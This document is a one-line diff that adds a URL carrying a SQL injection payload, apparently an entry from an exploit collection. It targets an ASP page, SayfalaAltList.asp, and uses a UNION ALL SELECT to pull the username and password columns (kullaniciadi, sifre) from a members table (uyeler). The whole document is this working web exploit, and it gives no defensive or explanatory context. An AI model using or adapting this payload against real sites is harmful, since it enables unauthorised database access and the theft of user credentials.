@@ -1,0 +1,1 @@
+http://www.example.com/path/SayfalaAltList.asp?ID=-1 UNION ALL SELECT 0,kullaniciadi,sifre FROM uyeler
